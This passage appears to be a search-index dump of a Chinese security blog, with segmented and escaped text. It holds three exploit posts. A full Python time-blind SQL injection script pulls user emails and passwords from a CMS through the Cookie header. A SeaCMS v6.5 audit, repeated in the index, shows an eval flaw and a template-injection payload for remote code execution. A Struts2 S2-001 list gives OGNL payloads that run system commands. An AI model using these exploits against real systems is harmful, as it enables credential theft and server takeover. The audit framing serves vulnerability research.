\u6210\u56e0 \u70b9 \uff0c \u5982\u679c cookie \u4e2d \u5b58\u5728 curstyle , \u4f18\u5148 \u9009\u7528 cookie \u4e2d \u7684 \u503c \uff0c \u7136\u540e \u5e26\u5165 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u3002 \u7531\u4e8e \u6ca1\u6709 \u627e\u5230 \u5177\u4f53 \u56de\u663e \u6570\u636e \u7684 \u5730\u65b9 \uff0c \u6240\u4ee5 \u91c7\u7528 \u65f6\u95f4 \u76f2\u6ce8 \u7684 \u65b9\u5f0f \u83b7\u53d6 \u6570\u636e \u83b7\u53d6\u6570\u636e \u3002   \u5e26\u4e0a \u81ea\u5df1 \u5199 \u7684 EXP   # ! / usr / bin / env   python   #   - * -   coding :   utf - 8   - * -   #   Created   by   wh1t3P1g   at   2017 / 1 / 30   import   requests , time   class   CookieBlindSqlInjection :   def   __ init __ ( self , url ) :   self . url = url   self . len = 0   def   getLength ( self , column , table ) :   payload0   =   \" curstyle = 1 ' | | if ( ( select   length ( cast ( bin ( length ( { column } ) )   as   char ) )   from   { table }   limit   { line _ start } , 1 ) = { flag } , sleep ( 5 ) , 1 ) = 1 # \"   payload1   =   \" curstyle = 1 ' | | if ( ( select   substr ( bin ( length ( { column } ) ) , { col _ start } , 1 )   from   { table }   limit   { line _ start } , 1 ) = 1 , 1 , sleep ( 5 ) ) = 1 # \"   # first   confirm   bin - format   data   length   len = 0   for   i   in   range ( 1 , 9 ) :   cookie = payload0 . format ( column = column , table = table , line _ start = 0 , flag = i )   flag = self . send ( cookie )   if   flag = = \" 0 \" :   len = i   break   res = \" \"   for   i   in   range ( 1 , len + 1 ) :   cookie = payload1 . format ( column = column , col _ start = i , table = table , line _ start = 0 )   flag = self . send ( cookie )   res + = flag   #   print   res   self . len = int ( res , 2 )   pprint ( \" * \" ,   \" fetch   \" + column + \"   length :   \" + str ( self . len ) )   return   int ( res , 2 )   def   getData ( self , column , table ) :   payload0 = \" curstyle = 1 ' | | if ( ( select   length ( cast ( bin ( ascii ( substr ( { column } , { data _ start } , 1 ) ) )   as   char ) )   from   { table }   limit   { line _ start } , 1 ) = { flag } , sleep ( 5 ) , 1 ) = 1 # \"   payload1   =   \" curstyle = 1 ' | | if ( ( select   substr ( bin ( ascii ( substr ( { column } , { data _ start } , 1 ) ) ) , { col _ start } , 1 )   from   { table }   limit   { line _ start } , 1 ) = 1 , 1 , sleep ( 5 ) ) = 1 # \"   total _ res = \" \"   for   i   in   range ( 1 , self . len + 1 ) : # \u5177\u4f53 \u6570\u636e \u7684 \u957f\u5ea6   len   =   0   for   j   in   range ( 1 ,   9 ) :   cookie   =   payload0 . format ( column = column , data _ start = i ,   table = table ,   line _ start = 0 ,   flag = j )   flag   =   self . send ( cookie )   if   flag   = =   \" 0 \" :   len   =   j   break   #   print   \" len : \" + str ( len )   res   =   \" \"   for   k   in   range ( 1 ,   len   +   1 ) :   cookie   =   payload1 . format ( column = column , data _ start = i ,   col _ start = k ,   table = table ,   line _ start = 0 )   flag   =   self . send ( cookie )   res   + =   flag   #   print   res   total _ res + = chr ( int ( res , 2 ) )   pprint ( \" * \" ,   \" fetch   \" + column + \" :   \" + total _ res )   return   total _ res   def   send ( self , cookie ) :   headers = { \" Cookie \" : cookie }   try :   r   =   requests . get ( self . url ,   headers = headers , timeout = 4 )   return   \" 1 \"   except :   return   \" 0 \"   def   pprint ( flag , content ) :   print   \" [ { flag } ]   [ { time } ]   { content } \"   \\   . format ( flag = flag ,   time = time . asctime ( time . localtime ( time . time ( ) ) ) ,   content = content )   if   __ name __ = = ' __ main __ ' :   cookieBlindSqlInjection = CookieBlindSqlInjection ( \" http : / / 127.0 . 0.1 / cms / DM / 20170123 / \" )   pprint ( \" * \" , \" program   start \" )   pprint ( \" * \" ,   \" start   fetching   column [ email ] \" )   cookieBlindSqlInjection . getLength ( \" email \" , \" zzz _ user \" )   email = cookieBlindSqlInjection . getData ( \" email \" , \" zzz _ user \" )   pprint ( \" * \" ,   \" start   fetching   column [ ps ] \" )   cookieBlindSqlInjection . getLength ( \" ps \" ,   \" zzz _ user \" )   ps = cookieBlindSqlInjection . getData ( \" ps \" ,   \" zzz _ user \" )   pprint ( \" * \" ,   \" [ email ] :   \" + email + \"   , [ ps ] :   \" + ps )   pprint ( \" * \" ,   \" program   done \" )   ps : DM \u8fd9\u4e2a \u9b3c \uff0c \u4ee3\u7801 \u5199 \u7684 \u597d \u4e71 \u554a T _ T","title":"\u524d\u53f0 cookie   \u65f6\u95f4 \u76f2\u6ce8"},{"location":"blog/2017/old-seacms-v6-5-getshell/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"\u6982\u8ff0   \u524d\u6bb5 \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u524d\u6bb5\u65f6\u95f4 \u653e\u5728   90sec   \u4e0a \u7684 \u4e00\u7bc7 \u4ee3\u7801 \u5ba1\u8ba1 \uff0c \u6536\u62fe \u4e00\u4e0b \u653e\u5230 \u81ea\u5df1 \u535a\u5ba2 \u4e0a   \u5206\u6790   cms \u7248\u672c \uff1a 6.45   \u76f4\u63a5 \u4e0a \u4ee3\u7801   function   parseIf ( $ content ) {   if   ( strpos ( $ content , ' { if : ' ) = = =   false ) {   return   $ content ;   } else {   $ labelRule   =   buildregx ( \" { if : ( . * ? ) } ( . * ? ) { end   if } \" , \" is \" ) ;   $ labelRule2 = \" { elseif \" ;   $ labelRule3 = \" { else } \" ;   preg _ match _ all ( $ labelRule , $ content , $ iar ) ;   $ arlen = count ( $ iar [ 0 ] ) ;   $ elseIfFlag = false ;   for ( $ m = 0 ; $ m < $ arlen ; $ m ++ ) {   $ strIf = $ iar [ 1 ] [ $ m ] ;   $ strIf = $ this - > parseStrIf ( $ strIf ) ;   $ strThen = $ iar [ 2 ] [ $ m ] ;   $ strThen = $ this - > parseSubIf ( $ strThen ) ;   if   ( strpos ( $ strThen , $ labelRule2 ) = = = false ) {   if   ( strpos ( $ strThen , $ labelRule3 ) > = 0 ) {   $ elsearray = explode ( $ labelRule3 , $ strThen ) ;   $ strThen1 = $ elsearray [ 0 ] ;   $ strElse1 = $ elsearray [ 1 ] ;   echo   \" if ( \" . $ strIf . \" )   {   \\ $ ifFlag = true ; }   else {   \\ $ ifFlag = false ; } \" ;   eval ( \" if ( \" . $ strIf . \" ) { \\ $ ifFlag = true ; } else { \\ $ ifFlag = false ; } \" ) ;   if   ( $ ifFlag ) {   $ content = str _ replace ( $ iar [ 0 ] [ $ m ] , $ strThen1 , $ content ) ; }   else   { $ content = str _ replace ( $ iar [ 0 ] [ $ m ] , $ strElse1 , $ content ) ; }   } else {   @ eval ( \" if ( \" . $ strIf . \" )   {   \\ $ ifFlag = true ; }   else {   \\ $ ifFlag = false ; } \" ) ;   if   ( $ ifFlag )   $ content = str _ replace ( $ iar [ 0 ] [ $ m ] , $ strThen , $ content ) ;   else   $ content = str _ replace ( $ iar [ 0 ] [ $ m ] , \" \" , $ content ) ; }   } else {   $ elseIfArray = explode ( $ labelRule2 , $ strThen ) ;   $ elseIfArrayLen = count ( $ elseIfArray ) ;   $ elseIfSubArray = explode ( $ labelRule3 , $ elseIfArray [ $ elseIfArrayLen - 1 ] ) ;   $ resultStr = $ elseIfSubArray [ 1 ] ;   $ elseIfArraystr0 = addslashes ( $ elseIfArray [ 0 ] ) ;   @ eval ( \" if ( $ strIf ) { \\ $ resultStr = \\ \" $ elseIfArraystr0 \\ \" ; } \" ) ;   for ( $ elseIfLen = 1 ; $ elseIfLen < $ elseIfArrayLen ; $ elseIfLen ++ ) {   $ strElseIf = getSubStrByFromAndEnd ( $ elseIfArray [ $ elseIfLen ] , \" : \" , \" } \" , \" \" ) ;   $ strElseIf = $ this - > parseStrIf ( $ strElseIf ) ;   $ strElseIfThen = addslashes ( getSubStrByFromAndEnd ( $ elseIfArray [ $ elseIfLen ] , \" } \" , \" \" , \" start \" ) ) ;   @ eval ( \" if ( \" . $ strElseIf . \" ) { \\ $ resultStr = \\ \" $ strElseIfThen \\ \" ; } \" ) ;   @ eval ( \" if ( \" . $ strElseIf . \" ) { \\ $ elseIfFlag = true ; } else { \\ $ elseIfFlag = false ; } \" ) ;   if   ( $ elseIfFlag )   { break ; }   }   $ strElseIf0 = getSubStrByFromAndEnd ( $ elseIfSubArray [ 0 ] , \" : \" , \" } \" , \" \" ) ;   $ strElseIfThen0 = addslashes ( getSubStrByFromAndEnd ( $ elseIfSubArray [ 0 ] , \" } \" , \" \" , \" start \" ) ) ;   if ( strpos ( $ strElseIf0 , ' = = ' ) = = = false && strpos ( $ strElseIf0 , ' = ' ) > 0 ) $ strElseIf0 = str _ replace ( ' = ' ,   ' = = ' ,   $ strElseIf0 ) ;   @ eval ( \" if ( \" . $ strElseIf0 . \" ) { \\ $ resultStr = \\ \" $ strElseIfThen0 \\ \" ; \\ $ elseIfFlag = true ; } \" ) ;   $ content = str _ replace ( $ iar [ 0 ] [ $ m ] , $ resultStr , $ content ) ;   }   }   return   $ content ;   }   }   \u4e0a\u9762 \u4e3b\u8981 \u903b\u8f91 \u4e3a \u89e3\u6790 html \u6587\u4ef6 \u4e2d \u7684 { if : } { end   if } \u6807\u7b7e \u4ee3\u7801 \uff0c \u53ef\u4ee5 \u770b\u5230 \u6ca1\u6709 \u505a \u4efb\u4f55 \u5904\u7406 \u5c31 eval \uff0c \u90a3\u4e48 \u6211\u4eec \u67e5\u627e \u4e00\u4e0b \u5bf9\u5e94 \u8c03\u7528 \u7684 \u5730\u65b9 \u4f1a \u4e0d\u4f1a \u6709 \u6f0f\u6d1e \u3002   \u4e3b\u8981 \u5173\u6ce8 \u524d\u53f0 \uff0c \u627e\u5230 \u4e00\u5904 \u89e3\u6790 \u641c\u7d22 \u7ed3\u679c \u7684 \u9875\u9762 \uff08 search . php \uff09 \uff0c \u4ee3\u7801 \u6bd4\u8f83 \u591a \uff0c \u4e00\u70b9 \u4e00\u70b9 \u4e00\u70b9\u4e00\u70b9 \u6765\u770b \u3002   \u627e\u5230 \u8c03\u7528 \u7684 \u4f4d\u7f6e line   212   $ content = $ mainClassObj - > parseIf ( $ content ) ;   \u5f80\u4e0a \u770b \uff0c \u53d1\u73b0 \u4ed6 \u7684 \u903b\u8f91 \u662f \u5148 \u89e3\u6790 \u5176\u4ed6 \u7c7b\u578b \u7684 \u6807\u7b7e \uff0c \u6bd4\u5982   { searchpage : page }   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u601d\u8def \uff0c \u4e3b\u8981 \u662f 2 \u70b9 \uff0c \u67e5\u627e \u5bf9\u5e94 if \u6807\u7b7e \u53ef\u63a7 \u7684 \u4f4d\u7f6e \uff0c \u53e6 \u4e00\u79cd \u5c31\u662f \u67e5\u627e \u5176\u4ed6 \u6807\u7b7e \u7684 \u53ef\u63a7 \u5185\u5bb9 \uff0c \u5199\u5165 if \u6807\u7b7e   \u6211 \u627e\u5230 \u4e00\u5904 \u5176\u4ed6 \u6807\u7b7e \u53ef\u63a7 \u4e14 \u6ca1\u6709 \u505a \u4efb\u4f55 \u5904\u7406 \u7684 \u4f4d\u7f6e \uff0c \u76f4\u63a5 \u5199\u5165 if \u6807\u7b7e \u8bed\u53e5 \u5373\u53ef \u9020\u6210 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c   function   echoSearchPage ( )   {   global   $ dsql , $ cfg _ iscache , $ mainClassObj , $ page , $ t1 , $ cfg _ search _ time , $ searchtype , $ searchword , $ tid , $ year , $ letter , $ area , $ yuyan , $ state , $ ver , $ order , $ jq , $ money , $ cfg _ basehost ;   $ order   =   ! empty ( $ order ) ? $ order : time ;   ...   ...   ...   $ content   =   str _ replace ( \" { searchpage : page } \" , $ page , $ content ) ;   $ content   =   str _ replace ( \" { seacms : searchword } \" , $ searchword , $ content ) ;   $ content   =   str _ replace ( \" { seacms : searchnum } \" , $ TotalResult , $ content ) ;   $ content   =   str _ replace ( \" { searchpage : ordername } \" , $ order , $ content ) ;   ...   ...   ...   order \u53d8\u91cf \u53ef\u63a7 \u5e76\u4e14 \u5728 \u8c03\u7528 parseIf \u51fd\u6570 \u524d\u5148 \u89e3\u6790 \uff0c \u6240\u4ee5 \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 order \u5199\u5165 if \u6807\u7b7e \u3002   \u67e5\u770b \u4e00\u4e0b \u5177\u4f53 html \u4ee3\u7801   < div   class = \" btn - toolbar \"   role = \" toolbar \" >   < div   class = \" btn - group \" >   < a   href = \" { searchpage : order - time - link } \"   { if : \" { searchpage : ordername } \" = = \" time \" }   class = \" btn   btn - success \"   { else }   class = \" btn   btn - default \"   { end   if }   id = \" orderhits \" > \u6700\u65b0 \u4e0a\u6620 < / a >   < a   href = \" { searchpage : order - hit - link } \"   { if : \" { searchpage : ordername } \" = = \" hit \" }   class = \" btn   btn - success \"   { else }   class = \" btn   btn - default \"   { end   if }   id = \" orderaddtime \" > \u6700\u8fd1 \u70ed\u64ad < / a >   < a   href = \" { searchpage : order - score - link } \"   { if : \" { searchpage : ordername } \" = = \" score \" }   class = \" btn   btn - success \"   { else }   class = \" btn   btn - default \"   { end   if }   id = \" ordergold \" > \u8bc4\u5206 \u6700\u9ad8 < / a >   < / div >   < / div >   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31 \u53ef\u4ee5 \u6784\u9020 poc \u4e86 \uff0c \u7c7b\u4f3c sql \u6ce8\u5165 \uff0c \u6211\u4eec \u5148 \u628a \u524d\u9762 \u7684 if \u6807\u7b7e \u8bed\u53e5 \u95ed\u5408 \uff0c \u5199\u5165 \u6076\u610f \u4ee3\u7801 \u6076\u610f\u4ee3\u7801 \u5e76 \u95ed\u5408 \u540e\u9762 \u7684 if \u6807\u7b7e \u3002   example \uff1a   } { end   if } { if : 1 ) phpinfo ( ) ; if ( 1 } { end   if }   \u672c\u5730 \u9a8c\u8bc1 \u4e00\u4e0b   \u603b\u7ed3   \u8fd9\u662f \u4e00\u4e2a \u6bd4\u8f83 \u7ecf\u5178 \u7684 \u6f0f\u6d1e \uff0c \u4e5f \u53ef\u4ee5 \u88ab \u79f0\u4e3a \u6a21\u7248 \u89e3\u6790 \u5427 \u6211 \u89c9\u5f97 \uff1a \uff09   ps :   \u540e\u6094 \u554a \uff0c \u6ca1\u6709 \u5148 \u63d0\u4ea4 \u4e2a poc \u5e73\u53f0 T _ T","title":"seacms   v6.5   \u524d\u53f0 getshell"},{"location":"blog/2017/old-seacms-v6-5-getshell/#_1","text":"\u524d\u6bb5 \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u524d\u6bb5\u65f6\u95f4 \u653e\u5728   90sec   \u4e0a \u7684 \u4e00\u7bc7 \u4ee3\u7801 \u5ba1\u8ba1 \uff0c \u6536\u62fe \u4e00\u4e0b \u653e\u5230 \u81ea\u5df1 \u535a\u5ba2 \u4e0a","title":"\u6982\u8ff0"},{"location":"blog/2017/old-seacms-v6-5-getshell/#_2","text":"cms \u7248\u672c \uff1a 6.45   \u76f4\u63a5 \u4e0a \u4ee3\u7801   function   parseIf ( $ content ) {   if   ( strpos ( $ content , ' { if : ' ) = = =   false ) {   return   $ content ;   } else {   $ labelRule   =   buildregx ( \" { if : ( . * ? ) } ( . * ? ) { end   if } \" , \" is \" ) ;   $ labelRule2 = \" { elseif \" ;   $ labelRule3 = \" { else } \" ;   preg _ match _ all ( $ labelRule , $ content , $ iar ) ;   $ arlen = count ( $ iar [ 0 ] ) ;   $ elseIfFlag = false ;   for ( $ m = 0 ; $ m < $ arlen ; $ m ++ ) {   $ strIf = $ iar [ 1 ] [ $ m ] ;   $ strIf = $ this - > parseStrIf ( $ strIf ) ;   $ strThen = $ iar [ 2 ] [ $ m ] ;   $ strThen = $ this - > parseSubIf ( $ strThen ) ;   if   ( strpos ( $ strThen , $ labelRule2 ) = = = false ) {   if   ( strpos ( $ strThen , $ labelRule3 ) > = 0 ) {   $ elsearray = explode ( $ labelRule3 , $ strThen ) ;   $ strThen1 = $ elsearray [ 0 ] ;   $ strElse1 = $ elsearray [ 1 ] ;   echo   \" if ( \" . $ strIf . \" )   {   \\ $ ifFlag = true ; }   else {   \\ $ ifFlag = false ; } \" ;   eval ( \" if ( \" . $ strIf . \" ) { \\ $ ifFlag = true ; } else { \\ $ ifFlag = false ; } \" ) ;   if   ( $ ifFlag ) {   $ content = str _ replace ( $ iar [ 0 ] [ $ m ] , $ strThen1 , $ content ) ; }   else   { $ content = str _ replace ( $ iar [ 0 ] [ $ m ] , $ strElse1 , $ content ) ; }   } else {   @ eval ( \" if ( \" . $ strIf . \" )   {   \\ $ ifFlag = true ; }   else {   \\ $ ifFlag = false ; } \" ) ;   if   ( $ ifFlag )   $ content = str _ replace ( $ iar [ 0 ] [ $ m ] , $ strThen , $ content ) ;   else   $ content = str _ replace ( $ iar [ 0 ] [ $ m ] , \" \" , $ content ) ; }   } else {   $ elseIfArray = explode ( $ labelRule2 , $ strThen ) ;   $ elseIfArrayLen = count ( $ elseIfArray ) ;   $ elseIfSubArray = explode ( $ labelRule3 , $ elseIfArray [ $ elseIfArrayLen - 1 ] ) ;   $ resultStr = $ elseIfSubArray [ 1 ] ;   $ elseIfArraystr0 = addslashes ( $ elseIfArray [ 0 ] ) ;   @ eval ( \" if ( $ strIf ) { \\ $ resultStr = \\ \" $ elseIfArraystr0 \\ \" ; } \" ) ;   for ( $ elseIfLen = 1 ; $ elseIfLen < $ elseIfArrayLen ; $ elseIfLen ++ ) {   $ strElseIf = getSubStrByFromAndEnd ( $ elseIfArray [ $ elseIfLen ] , \" : \" , \" } \" , \" \" ) ;   $ strElseIf = $ this - > parseStrIf ( $ strElseIf ) ;   $ strElseIfThen = addslashes ( getSubStrByFromAndEnd ( $ elseIfArray [ $ elseIfLen ] , \" } \" , \" \" , \" start \" ) ) ;   @ eval ( \" if ( \" . $ strElseIf . \" ) { \\ $ resultStr = \\ \" $ strElseIfThen \\ \" ; } \" ) ;   @ eval ( \" if ( \" . $ strElseIf . \" ) { \\ $ elseIfFlag = true ; } else { \\ $ elseIfFlag = false ; } \" ) ;   if   ( $ elseIfFlag )   { break ; }   }   $ strElseIf0 = getSubStrByFromAndEnd ( $ elseIfSubArray [ 0 ] , \" : \" , \" } \" , \" \" ) ;   $ strElseIfThen0 = addslashes ( getSubStrByFromAndEnd ( $ elseIfSubArray [ 0 ] , \" } \" , \" \" , \" start \" ) ) ;   if ( strpos ( $ strElseIf0 , ' = = ' ) = = = false && strpos ( $ strElseIf0 , ' = ' ) > 0 ) $ strElseIf0 = str _ replace ( ' = ' ,   ' = = ' ,   $ strElseIf0 ) ;   @ eval ( \" if ( \" . $ strElseIf0 . \" ) { \\ $ resultStr = \\ \" $ strElseIfThen0 \\ \" ; \\ $ elseIfFlag = true ; } \" ) ;   $ content = str _ replace ( $ iar [ 0 ] [ $ m ] , $ resultStr , $ content ) ;   }   }   return   $ content ;   }   }   \u4e0a\u9762 \u4e3b\u8981 \u903b\u8f91 \u4e3a \u89e3\u6790 html \u6587\u4ef6 \u4e2d \u7684 { if : } { end   if } \u6807\u7b7e \u4ee3\u7801 \uff0c \u53ef\u4ee5 \u770b\u5230 \u6ca1\u6709 \u505a \u4efb\u4f55 \u5904\u7406 \u5c31 eval \uff0c \u90a3\u4e48 \u6211\u4eec \u67e5\u627e \u4e00\u4e0b \u5bf9\u5e94 \u8c03\u7528 \u7684 \u5730\u65b9 \u4f1a \u4e0d\u4f1a \u6709 \u6f0f\u6d1e \u3002   \u4e3b\u8981 \u5173\u6ce8 \u524d\u53f0 \uff0c \u627e\u5230 \u4e00\u5904 \u89e3\u6790 \u641c\u7d22 \u7ed3\u679c \u7684 \u9875\u9762 \uff08 search . php \uff09 \uff0c \u4ee3\u7801 \u6bd4\u8f83 \u591a \uff0c \u4e00\u70b9 \u4e00\u70b9 \u4e00\u70b9\u4e00\u70b9 \u6765\u770b \u3002   \u627e\u5230 \u8c03\u7528 \u7684 \u4f4d\u7f6e line   212   $ content = $ mainClassObj - > parseIf ( $ content ) ;   \u5f80\u4e0a \u770b \uff0c \u53d1\u73b0 \u4ed6 \u7684 \u903b\u8f91 \u662f \u5148 \u89e3\u6790 \u5176\u4ed6 \u7c7b\u578b \u7684 \u6807\u7b7e \uff0c \u6bd4\u5982   { searchpage : page }   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u601d\u8def \uff0c \u4e3b\u8981 \u662f 2 \u70b9 \uff0c \u67e5\u627e \u5bf9\u5e94 if \u6807\u7b7e \u53ef\u63a7 \u7684 \u4f4d\u7f6e \uff0c \u53e6 \u4e00\u79cd \u5c31\u662f \u67e5\u627e \u5176\u4ed6 \u6807\u7b7e \u7684 \u53ef\u63a7 \u5185\u5bb9 \uff0c \u5199\u5165 if \u6807\u7b7e   \u6211 \u627e\u5230 \u4e00\u5904 \u5176\u4ed6 \u6807\u7b7e \u53ef\u63a7 \u4e14 \u6ca1\u6709 \u505a \u4efb\u4f55 \u5904\u7406 \u7684 \u4f4d\u7f6e \uff0c \u76f4\u63a5 \u5199\u5165 if \u6807\u7b7e \u8bed\u53e5 \u5373\u53ef \u9020\u6210 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c   function   echoSearchPage ( )   {   global   $ dsql , $ cfg _ iscache , $ mainClassObj , $ page , $ t1 , $ cfg _ search _ time , $ searchtype , $ searchword , $ tid , $ year , $ letter , $ area , $ yuyan , $ state , $ ver , $ order , $ jq , $ money , $ cfg _ basehost ;   $ order   =   ! empty ( $ order ) ? $ order : time ;   ...   ...   ...   $ content   =   str _ replace ( \" { searchpage : page } \" , $ page , $ content ) ;   $ content   =   str _ replace ( \" { seacms : searchword } \" , $ searchword , $ content ) ;   $ content   =   str _ replace ( \" { seacms : searchnum } \" , $ TotalResult , $ content ) ;   $ content   =   str _ replace ( \" { searchpage : ordername } \" , $ order , $ content ) ;   ...   ...   ...   order \u53d8\u91cf \u53ef\u63a7 \u5e76\u4e14 \u5728 \u8c03\u7528 parseIf \u51fd\u6570 \u524d\u5148 \u89e3\u6790 \uff0c \u6240\u4ee5 \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 order \u5199\u5165 if \u6807\u7b7e \u3002   \u67e5\u770b \u4e00\u4e0b \u5177\u4f53 html \u4ee3\u7801   < div   class = \" btn - toolbar \"   role = \" toolbar \" >   < div   class = \" btn - group \" >   < a   href = \" { searchpage : order - time - link } \"   { if : \" { searchpage : ordername } \" = = \" time \" }   class = \" btn   btn - success \"   { else }   class = \" btn   btn - default \"   { end   if }   id = \" orderhits \" > \u6700\u65b0 \u4e0a\u6620 < / a >   < a   href = \" { searchpage : order - hit - link } \"   { if : \" { searchpage : ordername } \" = = \" hit \" }   class = \" btn   btn - success \"   { else }   class = \" btn   btn - default \"   { end   if }   id = \" orderaddtime \" > \u6700\u8fd1 \u70ed\u64ad < / a >   < a   href = \" { searchpage : order - score - link } \"   { if : \" { searchpage : ordername } \" = = \" score \" }   class = \" btn   btn - success \"   { else }   class = \" btn   btn - default \"   { end   if }   id = \" ordergold \" > \u8bc4\u5206 \u6700\u9ad8 < / a >   < / div >   < / div >   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31 \u53ef\u4ee5 \u6784\u9020 poc \u4e86 \uff0c \u7c7b\u4f3c sql \u6ce8\u5165 \uff0c \u6211\u4eec \u5148 \u628a \u524d\u9762 \u7684 if \u6807\u7b7e \u8bed\u53e5 \u95ed\u5408 \uff0c \u5199\u5165 \u6076\u610f \u4ee3\u7801 \u6076\u610f\u4ee3\u7801 \u5e76 \u95ed\u5408 \u540e\u9762 \u7684 if \u6807\u7b7e \u3002   example \uff1a   } { end   if } { if : 1 ) phpinfo ( ) ; if ( 1 } { end   if }   \u672c\u5730 \u9a8c\u8bc1 \u4e00\u4e0b","title":"\u5206\u6790"},{"location":"blog/2017/old-seacms-v6-5-getshell/#_3","text":"\u8fd9\u662f \u4e00\u4e2a \u6bd4\u8f83 \u7ecf\u5178 \u7684 \u6f0f\u6d1e \uff0c \u4e5f \u53ef\u4ee5 \u88ab \u79f0\u4e3a \u6a21\u7248 \u89e3\u6790 \u5427 \u6211 \u89c9\u5f97 \uff1a \uff09   ps :   \u540e\u6094 \u554a \uff0c \u6ca1\u6709 \u5148 \u63d0\u4ea4 \u4e2a poc \u5e73\u53f0 T _ T","title":"\u603b\u7ed3"},{"location":"blog/2017/struts2-history-payload/","tags":["java"],"text":"\u6982\u8ff0   \u6700\u8fd1 \u5728 \u5199 Struts2 \u7684 \u4e00\u4e9b PoC \uff0c \u8bb0\u5f55 \u4e00\u4e0b \u5404\u4e2a \u7248\u672c \u7684 PoC \u65b9\u4fbf \u65f6\u5019 \u5230\u65f6\u5019 \u67e5\u9605 \u3002 \u5148\u63d0 \u4e00\u4e0b \u53c2\u8003 \u7684 \u524d\u8f88 \u4eec \u7684 \u7f51\u5740 \uff0c \u611f\u8c22 \ud83d\ude4f   http : / / rickgray . me / 2016 / 05 / 06 / review - struts2 - remote - command - execution - vulnerabilities . html   http : / / www . cnblogs . com / LittleHann / p / 4606891 . html   https : / / cwiki . apache . org / confluence / display / WW / S2 - xxx   http : / / blog . nsfocus . net / tech / % E7% 83% AD% E7% 82% B9% E8% B7% 9F% E8% B8% AA / 2016 / 06 / 16 / Struts2 - S2 - 037 ( CVE - 2016 - 4438 ) % E6% BC% 8F% E6% B4% 9E% E5% 88% 86% E6% 9E% 90 . html   https : / / cwiki . apache . org / confluence / display / WW / S2 - 009   Struts2 \u547d\u4ee4 \u6267\u884c \u96c6\u5408   \u4e0b\u6587 \u4e0d\u662f \u5177\u4f53 \u7684 \u5206\u6790 \u6587 \uff0c \u80fd\u529b \u6709\u9650 \uff0c \u4ec5 \u8bb0\u5f55 \u4e00\u4e0b \u4ee5 \u505a \u5c06\u6765 \u590d\u4e60 \u67e5\u7528 \u3002   \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u8fc7\u6bb5\u65f6\u95f4 \u4f1a \u5c06 \u6240\u6709 \u7684 \u6f0f\u6d1e \u73af\u5883 \u4e0a \u4f20\u5230 github \u4e0a \uff0c \u73af\u5883 \u6765\u6e90 \u5927\u90e8 \u90e8\u5206 \u5927\u90e8\u5206 \u4e3a \u6211 \u5076\u50cf   rickgray   \u535a\u5ba2 \u4e0a \u5171\u4eab \u7684 \u4ee5\u53ca \u5b98 \u7f51\u4e0a \u4e0b \u7684 \u5bf9\u5e94 \u7248\u672c \u7684 \u793a\u4f8b \u73af\u5883 \u3002   update : 2017 / 1 / 16   \u73af\u5883 \u5730\u5740   Struts2   S2 - 001   \u5f71\u54cd \u7248\u672c \uff1a 2.0 . 0   -   2.0 . 8   \u5177\u4f53 \u8be6\u60c5 \uff1a https : / / struts . apache . org / docs / s2 - 001 . html   \u8be5 \u6f0f\u6d1e \u56e0\u4e3a \u7528\u6237 \u63d0\u4ea4 \u8868\u5355 \u6570\u636e \u5e76\u4e14 \u9a8c\u8bc1 \u5931\u8d25 \u65f6 \uff0c \u540e\u7aef \u4f1a \u5c06 \u7528\u6237 \u4e4b\u524d \u63d0\u4ea4 \u7684 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \u4f7f\u7528   OGNL   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   % { value }   \u8fdb\u884c \u89e3\u6790 \uff0c \u7136\u540e \u91cd\u65b0 \u586b\u5145 \u5230 \u5bf9\u5e94 \u7684 \u8868\u5355 \u6570\u636e \u4e2d \u3002 \u4f8b\u5982 \u6ce8\u518c \u6216 \u767b\u5f55 \u9875\u9762 \uff0c \u63d0\u4ea4 \u5931\u8d25 \u540e \u7aef \u4e00\u822c \u4f1a \u9ed8\u8ba4 \u8fd4\u56de \u4e4b\u524d \u63d0\u4ea4 \u7684 \u6570\u636e \uff0c \u7531\u4e8e \u540e \u7aef \u4f7f\u7528   % { value }   \u5bf9 \u63d0\u4ea4 \u7684 \u6570\u636e \u6267\u884c \u4e86 \u4e00\u6b21   OGNL   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u89e3\u6790 \uff0c \u6240\u4ee5 \u53ef\u4ee5 \u76f4\u63a5 \u6784\u9020   Payload   \u8fdb\u884c \u547d\u4ee4 \u6267\u884c   \u4e0a\u6587 \u5f15\u7528   rickgray   \u7684 \u63cf\u8ff0 \u3002   \u6784\u9020 PoC   ##   \u83b7\u53d6 tomcat \u6267\u884c \u8def\u5f84   % { \" tomcatBinDir { \" + @ java . lang . System @ getProperty ( \" user . dir \" ) + \" } \" }   ##   \u83b7\u53d6 web \u76ee\u5f55 \u6839\u76ee\u5f55   % { ## req = @ org . apache . struts2 . ServletActionContext @ getRequest ( ) , ## response = ## context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) . getWriter ( ) , ## response . println ( ## req . getRealPath ( ' / ' ) ) , ## response . flush ( ) , ## response . close ( ) }   ##   \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4   % { ## a = ( new   java . lang . ProcessBuilder ( \" whoami \" ) ) . start ( ) , ## b = ## a . getInputStream ( ) , ## c = new   java . io . InputStreamReader ( ## b ) , ## d = new   java . io . BufferedReader ( ## c ) , ## e = new   char [ 50000 ] , ## d . read ( ## e ) , ## matt = ## context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) , ## matt . getWriter ( ) . println ( new   java . lang . String ( ## e ) ) , ## matt . 